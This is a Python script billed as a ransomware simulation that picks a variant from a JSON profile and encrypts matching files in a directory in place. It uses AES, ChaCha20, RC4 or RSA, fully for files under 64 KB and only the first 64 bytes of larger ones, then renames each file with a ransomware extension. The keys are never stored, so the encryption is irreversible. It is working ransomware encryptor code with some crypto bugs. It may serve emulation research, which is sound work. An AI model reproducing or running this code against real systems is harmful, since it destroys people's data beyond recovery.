import json
import os
import zipfile
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric.padding import OAEP
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from cryptography.hazmat.primitives.asymmetric import padding

# Load ransomware information from ransom.json
def load_ransomware_data():
    with open("ransom.json", "r") as file:
        return json.load(file)

# Display available ransomware to the user
def display_ransomware_options(ransomware_data):
    print("Available Ransomware Variants:")
    for idx, ransomware in enumerate(ransomware_data):
        print(f"{idx + 1}. {ransomware['ransomware']}")

# Helper function to check file size
def check_file_size(file_path):
    file_size = os.path.getsize(file_path)
    if file_size < (64 * 1024):  # < 1KB
        return 'full'
    else:
        return 'partial'

# AES Encryption
def aes_encrypt(data, key):
    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(data) + encryptor.finalize()

# ChaCha20 Encryption
def chacha20_encrypt(data, key, nonce):
    cipher = Cipher(algorithms.ChaCha20(key, nonce), mode=None, backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(data)

# RC4 Encryption
def rc4_encrypt(data, key):
    cipher = Cipher(algorithms.ARC4(key), mode=None, backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(data)

# RSA Encryption
def rsa_encrypt(data, public_key):
    return public_key.encrypt(
        data,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

# Encrypt file based on encryption type
def encrypt_file(file_path, enc_type, enc_algo, key=None, rsa_key=None):
    file_size = os.path.getsize(file_path)
    if(check_file_size(file_path)=='full'):
         with open(file_path, "rb") as file:
              file_data = file.read()    # Reads the whole doc if full encryption needed 
    else:
        with open(file_path, "rb") as file:
              file_data = file.read(64)       # Reads only 64 bytes if partial encryption si to be done 

    # Choose encryption algorithm based on enc_type
    if enc_type == "AES":
        encrypted_data = aes_encrypt(file_data, key)
    elif enc_type == "ChaCha20":
        nonce = os.urandom(16)  # ChaCha20 requires a nonce
        encrypted_data = chacha20_encrypt(file_data, key, nonce)
    elif enc_type == "RC4":
        encrypted_data = rc4_encrypt(file_data, key)
    elif enc_type == "RSA":
        encrypted_data = rsa_encrypt(file_data, rsa_key.public_key())
    elif enc_type == "AES + RSA":
        encrypted_data = aes_encrypt(file_data, key)
        encrypted_data = rsa_encrypt(encrypted_data, rsa_key.public_key())
    elif enc_type == "ChaCha20 + RSA":
        nonce = os.urandom(16)
        encrypted_data = chacha20_encrypt(file_data, key, nonce)
        encrypted_data = rsa_encrypt(encrypted_data, rsa_key.public_key())

    # Write encrypted data back to file
    with open(file_path, "wb") as file:
        file.write(encrypted_data)

# Add ransomware-specific extension to the file
def add_extension(file_path, extension):
    new_file_path = f"{file_path}{extension}"
    os.rename(file_path, new_file_path)
    return new_file_path

# Zip files with password protection if required
def zip_files(directory, target_files, password, zip_type="Standard_zip"):
    zip_name = os.path.join(directory, "encrypted_files.zip")
    
    with zipfile.ZipFile(zip_name, 'w') as zipf:
        for file in target_files:
            zipf.write(file)

    print(f"Files zipped into {zip_name} with zip type: {zip_type}")

# Main function that runs the ransomware simulation
def run_ransomware_simulation():
    # Load ransomware data from the JSON file
    ransomware_data = load_ransomware_data()

    # Display available options
    display_ransomware_options(ransomware_data)

    # Choose the ransomware variant
    choice = int(input("Choose a ransomware by entering its number: ")) - 1
    selected_ransomware = ransomware_data[choice]

    # Generate key based on encryption algorithm
    if "AES" in selected_ransomware["enc-type"] or "ChaCha20" in selected_ransomware["enc-type"]:
        key = os.urandom(32)  # Random 256-bit AES or ChaCha20 key
    else:
        key = None
    
    # Generate RSA key pair
    if "RSA" in selected_ransomware["enc-type"]:
        rsa_key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
    else:
        rsa_key = None

    # Check if the ransomware specifies a zip type
    if selected_ransomware["zip_type"] and selected_ransomware["zip_type"] != "None":
        print(f"{selected_ransomware['ransomware']} uses zip type: {selected_ransomware['zip_type']}. Zipping files...")
        # Get directory and target files from the user
        directory = r'D:\Cyber\Malware\MoSer\target' ## CHANGE THIS DIRECTORY PATH
        target_files = [os.path.join(directory, file) for file in os.listdir(directory) 
                        if file.endswith(tuple(selected_ransomware["targets"]))]

        # Zip the files with the specified zip type
        zip_files(directory, target_files, password="ransom", zip_type=selected_ransomware["zip_type"])
    else:
        print(f"Encrypting files using {selected_ransomware['enc-type']} and algorithm {selected_ransomware['enc-algo']}...")

        # Get directory and target files from the user
        directory = r'D:\Cyber\Malware\MoSer\target' ## CHANGE THIS DIRECTORY PATH
        target_files = [os.path.join(directory, file) for file in os.listdir(directory) 
                        if file.endswith(tuple(selected_ransomware["targets"]))]

        # Encrypt each file and apply the ransomware extension
        for file in target_files:
            encrypt_file(file, selected_ransomware["enc-type"], selected_ransomware["enc-algo"], key, rsa_key)
            encrypted_file = add_extension(file, selected_ransomware["extension"])
            print(f"Encrypted and renamed: {encrypted_file}")

# Run the ransomware simulation
if __name__ == "__main__":
    run_ransomware_simulation()